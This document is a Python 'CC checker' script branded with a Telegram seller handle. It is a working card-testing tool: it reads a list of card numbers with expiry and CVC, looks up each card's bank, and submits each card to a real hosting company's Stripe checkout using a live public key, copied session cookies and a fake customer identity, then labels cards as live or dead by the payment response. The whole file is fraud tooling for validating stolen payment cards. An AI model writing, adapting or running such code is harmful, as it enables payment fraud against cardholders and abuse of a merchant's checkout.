import pyfiglet
logo = pyfiglet.figlet_format('     BARRY CC     CHECKER  ')


file=open('private ccs.txt',"+r") #name combo


from requests import *
import requests,time
from colorama import Fore
import pyfiglet
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
import os
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
def lupin(text, delay, add_new_line=True):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    if add_new_line:
        print("\n", end="", flush=True)
print(Z+logo)
lupin(F+f"\033[1;32m\n                  Owner of checker : @Barry_op\n                        Telegram User👤: @Barry_op \n                         Gateway🌶 : NEW STRIPE 12$  』", 0.07, True)
lupin(C+f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", 0.07, True)

print(X+'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#

start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	try:
		data = requests.get('https://lookup.binlist.net/'+P[:6]).json()
	except:
		pass
	try:
		bank=(data['bank']['name'])
	except:
		bank=('unknown ⚠️')
	try:
		emj=(data['country']['emoji'])
	except:
		emj=('unknown ⚠️')
	try:
		cn=(data['country']['name'])
	except:
		cn=('unknown ⚠️')
	try:
		dicr=(data['scheme'])
	except:
		dicr=('unknown ⚠️')
	try:
		typ=(data['type'])
	except:
		typ=('unknown ⚠️')
	try:
		url=(data['bank']['url'])
	except:
		url=('unknown ⚠️')
	headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Referer': 'https://js.stripe.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://js.stripe.com',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'Priority': 'u=4',
    # Requests doesn't support trailers
    # 'TE': 'trailers',
}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=dafe0186-18f3-4f1c-b9d7-62f673aa9e20c01591&muid=ac2f2aef-955a-4826-91ba-165e864fca15885ee9&sid=a07868d1-91a5-44a1-b8c8-9675e67d34fb687f82&payment_user_agent=stripe.js%2F287a370dbf%3B+stripe-js-v3%2F287a370dbf%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=174943&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx'

	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id = response.json().get('id')    
	import requests
	
	cookies = {
    'WHMCSy551iLvnhYt7': '0e2334e6c1c70ccbebd7866810b2a5eb',
    '_fbp': 'fb.1.1724855553420.557711399312761713',
    '__zlcmid': '1NTmyhhkWEjQORw',
    '__stripe_mid': 'ac2f2aef-955a-4826-91ba-165e864fca15885ee9',
    '__stripe_sid': 'a07868d1-91a5-44a1-b8c8-9675e67d34fb687f82',
    '_ga_MML13XH5B4': 'GS1.1.1724857362.1.1.1724857458.60.0.0',
    '_ga': 'GA1.1.2091653737.1724857363',
    'PAPVisitorId': 'cnIcTtkMuBETncDsgRGoq2EvioYXdtXH',
}

	headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://my.hostarmada.com',
    'Connection': 'keep-alive',
    'Referer': 'https://my.hostarmada.com/cart.php?a=checkout&e=false',
    # 'Cookie': 'WHMCSy551iLvnhYt7=0e2334e6c1c70ccbebd7866810b2a5eb; _fbp=fb.1.1724855553420.557711399312761713; __zlcmid=1NTmyhhkWEjQORw; __stripe_mid=ac2f2aef-955a-4826-91ba-165e864fca15885ee9; __stripe_sid=a07868d1-91a5-44a1-b8c8-9675e67d34fb687f82; _ga_MML13XH5B4=GS1.1.1724857362.1.1.1724857458.60.0.0; _ga=GA1.1.2091653737.1724857363; PAPVisitorId=cnIcTtkMuBETncDsgRGoq2EvioYXdtXH',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    # Requests doesn't support trailers
    # 'TE': 'trailers',
}

	data = {
    'token': '88c1289d05cf1ab4c04a94c7261e5a6ae801f334',
    'submit': 'true',
    'custtype': 'new',
    'loginemail': '',
    'loginpassword': '',
    'firstname': 'jhon',
    'lastname': 'wick',
    'email': 'gokeje3802@kwalah.com',
    'country-calling-code-phonenumber': [
        '1',
        '',
    ],
    'phonenumber': '910-555-4444',
    'companyname': '',
    'address1': 'street 78',
    'address2': '',
    'city': 'los angles',
    'state': 'California',
    'postcode': '90003',
    'country': 'US',
    'contact': '',
    'domaincontactfirstname': '',
    'domaincontactlastname': '',
    'domaincontactemail': '',
    'country-calling-code-domaincontactphonenumber': '1',
    'domaincontactphonenumber': '',
    'domaincontactcompanyname': '',
    'domaincontactaddress1': '',
    'domaincontactaddress2': '',
    'domaincontactcity': '',
    'domaincontactstate': '',
    'domaincontactpostcode': '',
    'domaincontactcountry': 'US',
    'domaincontacttax_id': '',
    'password': 'Lupinbigass266@@',
    'password2': 'Lupinbigass266@@',
    'paymentmethod': 'stripe',
    'ccinfo': 'new',
    'ccdescription': 'jhon wick',
    'marketingoptin': '1',
    'accepttos': 'on',
    'payment_method_id': id,
}

	response = requests.post(
    'https://my.hostarmada.com/index.php?rp=/stripe/payment/intent',
    cookies=cookies,
    headers=headers,
    data=data,
)
	try:
		if "Your card has insufficient funds." in response.text or "Your card does not support this type of purchase." in response.text or "Payment success" in response.text or "Payment Completed." in response.text or "Thank you for your support." in response.text:
			print(F+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
		else:
			print(Z+f'[ {start_num} ]',P,' ➜ ',response.json()['warning'])
	except:
		print(response.text)